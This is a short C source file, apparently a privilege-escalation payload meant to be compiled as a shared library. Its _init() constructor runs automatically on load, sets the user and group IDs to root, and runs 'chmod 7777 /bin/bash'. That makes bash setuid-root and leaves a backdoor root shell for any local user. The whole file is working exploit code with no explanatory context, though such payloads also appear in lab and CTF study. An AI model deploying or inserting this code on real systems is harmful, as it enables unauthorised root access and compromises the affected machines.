#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        setuid(0);
        setgid(0);
        system("chmod 7777 /bin/bash");
}
